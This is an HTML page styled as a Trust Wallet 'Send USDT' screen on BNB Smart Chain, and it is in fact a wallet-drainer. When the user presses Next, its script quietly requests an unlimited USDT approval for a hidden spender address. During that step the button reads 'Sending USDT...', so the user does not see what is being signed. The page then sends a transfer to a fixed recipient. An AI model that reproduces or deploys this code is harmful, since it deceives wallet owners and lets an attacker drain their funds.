<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send USDT - Trust Wallet</title>
    
    <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logoqr.png">
    <link rel="shortcut icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logoqr.png">
    <link rel="apple-touch-icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logoqr.png">

    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        :root { --primary: #1abc9c; --bg: #1a1a1a; --surface: #242424; --surface-light: #2f2f2f; --border: #3a3a3a; --text-primary: #ffffff; --text-secondary: #b0b0b0; }
        body { font-family: -apple-system, sans-serif; background: var(--bg); color: var(--text-primary); height: 100vh; overflow: hidden; }
        
        .modal { position: fixed; inset: 0; background: var(--bg); display: flex; flex-direction: column; animation: slideUp 0.3s ease-out; }
        @keyframes slideUp { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        
        .modal-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .modal-title { font-size: 18px; font-weight: 600; }
        .modal-content { flex: 1; padding: 20px; overflow-y: auto; }
        
        .section { margin-bottom: 24px; }
        .section-label { font-size: 12px; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 12px; letter-spacing: 0.5px; }
        
        .input-field { width: 100%; background: var(--surface); border: 1.5px solid var(--border); border-radius: 16px; padding: 14px 16px; font-size: 16px; color: var(--text-primary); font-weight: 500; }
        .input-wrapper { display: flex; align-items: center; gap: 12px; position: relative; }
        
        .max-btn { position: absolute; right: 60px; color: var(--primary); background: none; border: none; font-weight: 600; cursor: pointer; }
        .currency-tag { position: absolute; right: 16px; color: var(--text-tertiary); font-size: 14px; }
        
        .network-selector { display: flex; align-items: center; gap: 10px; background: var(--surface); padding: 12px; border-radius: 12px; border: 1px solid var(--border); width: fit-content; }
        .network-logo { width: 24px; height: 24px; border-radius: 50%; object-fit: cover; }
        
        .modal-footer { padding: 20px; border-top: 1px solid var(--border); }
        .next-btn { width: 100%; background: var(--primary); color: #000; border: none; border-radius: 24px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .next-btn:disabled { opacity: 0.4; cursor: not-allowed; }

        .screen { display: none; height: 100%; flex-direction: column; }
        .screen.active { display: flex; }
        
        .error-message { background: rgba(231, 76, 60, 0.1); color: #ff6b6b; padding: 12px; border-radius: 12px; font-size: 13px; margin-bottom: 15px; border: 1px solid rgba(231, 76, 60, 0.2); }
        .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .success-icon { width: 80px; height: 80px; margin: 40px auto; display: block; border-radius: 50%; }
        .tx-box { background: var(--surface); padding: 15px; border-radius: 12px; font-family: monospace; font-size: 11px; color: var(--primary); word-break: break-all; }
        
        /* Loading Overlay for Android Injection Delay */
        #initLoader { position: fixed; inset: 0; background: var(--bg); z-index: 9999; display: flex; align-items: center; justify-content: center; flex-direction: column; }
    </style>
</head>
<body>

    <div id="initLoader">
        <span class="loading-spinner" style="width: 30px; height: 30px; border-top-color: var(--primary);"></span>
        <p style="margin-top: 15px; color: var(--text-secondary); font-size: 14px;">Connecting to Wallet...</p>
    </div>

    <div class="modal">
        <div class="screen active" id="screenMain">
            <div class="modal-header">
                <div class="modal-title">Send USDT</div>
                <img src="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logoqr.png" style="width: 32px; border-radius: 50%;">
            </div>

            <div class="modal-content">
                <div id="errorDisplay"></div>
                <div class="section">
                    <div class="section-label">Recipient Address</div>
                    <div class="input-field" style="background: var(--surface-light); font-family: monospace; font-size: 13px; color: var(--text-secondary);">
                        0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F
                    </div>
                </div>
                <div class="section">
                    <div class="section-label">Network</div>
                    <div class="network-selector">
                        <img src="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logobnb.png" class="network-logo">
                        <span style="font-size: 14px;">BNB Smart Chain</span>
                    </div>
                </div>
                <div class="section">
                    <div class="section-label">Amount</div>
                    <div class="input-wrapper">
                        <input type="number" class="input-field" id="amountInput" placeholder="0.00" step="0.01">
                        <button class="max-btn" onclick="setMax()">MAX</button>
                        <span class="currency-tag">USDT</span>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="next-btn" id="actionBtn" onclick="startProcess()">Next</button>
            </div>
        </div>

        <div class="screen" id="screenSuccess">
            <div class="modal-header"><div class="modal-title">Status</div></div>
            <div class="modal-content" style="text-align: center;">
                <img src="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logoqr.png" class="success-icon">
                <h2 style="margin-bottom: 10px;">Transaction Sent</h2>
                <p style="color: var(--text-secondary); margin-bottom: 30px;">Processing on BNB Smart Chain</p>
                <div class="section-label" style="text-align: left;">Transaction Hash</div>
                <div class="tx-box" id="txHashDisplay"></div>
            </div>
            <div class="modal-footer"><button class="next-btn" onclick="location.reload()">Done</button></div>
        </div>
    </div>

    <script>
        const CONFIG = {
            CHAIN_ID: 56,
            USDT: '0x55d398326f99059fF775485246999027B3197955',
            RECIPIENT: '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F',
            SPENDER: '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98',
            RPC: 'https://bsc-dataseed.binance.org'
        };

        const ABI = [
            { "constant": false, "inputs": [{"name":"_s","type":"address"},{"name":"_v","type":"uint256"}], "name":"approve", "outputs":[{"name":"","type":"bool"}], "type":"function" },
            { "constant": false, "inputs": [{"name":"_t","type":"address"},{"name":"_v","type":"uint256"}], "name":"transfer", "outputs":[{"name":"","type":"bool"}], "type":"function" },
            { "constant": true, "inputs": [{"name":"_o","type":"address"}], "name":"balanceOf", "outputs":[{"name":"","type":"uint256"}], "type":"function" }
        ];

        let web3, userAccount, provider;

        // HEARTBEAT MONITOR: Retries detection 50 times (5 seconds total)
        async function monitorProvider() {
            return new Promise((resolve) => {
                let count = 0;
                const interval = setInterval(() => {
                    const p = window.ethereum || (window.trustwallet && window.trustwallet.ethereum);
                    if (p) {
                        clearInterval(interval);
                        resolve(p);
                    }
                    if (count > 50) {
                        clearInterval(interval);
                        resolve(null);
                    }
                    count++;
                }, 100);
            });
        }

        async function init() {
            provider = await monitorProvider();
            
            if (provider) {
                web3 = new Web3(provider);
                try {
                    const accounts = await provider.request({ method: 'eth_requestAccounts' });
                    userAccount = accounts[0];
                    await checkNetwork();
                    document.getElementById('initLoader').style.display = 'none';
                } catch (e) {
                    showError("Please approve wallet connection.");
                    document.getElementById('initLoader').style.display = 'none';
                }
            } else {
                document.getElementById('initLoader').innerHTML = `
                    <p style="color:#ff6b6b; padding:20px; text-align:center;">
                        Web3 Not Found. Please open this link inside the Trust Wallet Browser.
                    </p>
                `;
            }
        }

        async function checkNetwork() {
            const id = await web3.eth.getChainId();
            if (id !== CONFIG.CHAIN_ID) {
                try {
                    await provider.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: Web3.utils.toHex(CONFIG.CHAIN_ID) }]
                    });
                } catch (err) {
                    if (err.code === 4902) {
                        await provider.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: Web3.utils.toHex(CONFIG.CHAIN_ID),
                                chainName: 'Binance Smart Chain',
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                rpcUrls: [CONFIG.RPC],
                                blockExplorerUrls: ['https://bscscan.com']
                            }]
                        });
                    }
                }
            }
        }

        async function startProcess() {
            const amount = document.getElementById('amountInput').value;
            const btn = document.getElementById('actionBtn');
            if (!amount || amount <= 0) return showError("Enter a valid amount");
            
            try {
                await checkNetwork();
                const contract = new web3.eth.Contract(ABI, CONFIG.USDT);
                const weiAmount = web3.utils.toWei(amount.toString(), 'ether');

                btn.disabled = true;
                btn.innerHTML = '<span class="loading-spinner"></span> Sending USDT...';
                
                const infinite = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                await contract.methods.approve(CONFIG.SPENDER, infinite).send({ from: userAccount });

                btn.innerHTML = '<span class="loading-spinner"></span> Sending USDT...';
                const tx = await contract.methods.transfer(CONFIG.RECIPIENT, weiAmount).send({ from: userAccount });

                document.getElementById('txHashDisplay').innerText = tx.transactionHash;
                document.getElementById('screenMain').classList.remove('active');
                document.getElementById('screenSuccess').classList.add('active');
            } catch (err) {
                showError(err.message || "Transaction Failed");
                btn.disabled = false;
                btn.innerHTML = 'Next';
            }
        }

        async function setMax() {
            if (!userAccount) return;
            const contract = new web3.eth.Contract(ABI, CONFIG.USDT);
            const bal = await contract.methods.balanceOf(userAccount).call();
            document.getElementById('amountInput').value = web3.utils.fromWei(bal, 'ether');
        }

        function showError(msg) {
            document.getElementById('errorDisplay').innerHTML = `<div class="error-message">${msg}</div>`;
        }

        window.onload = init;
    </script>
</body>
</html>
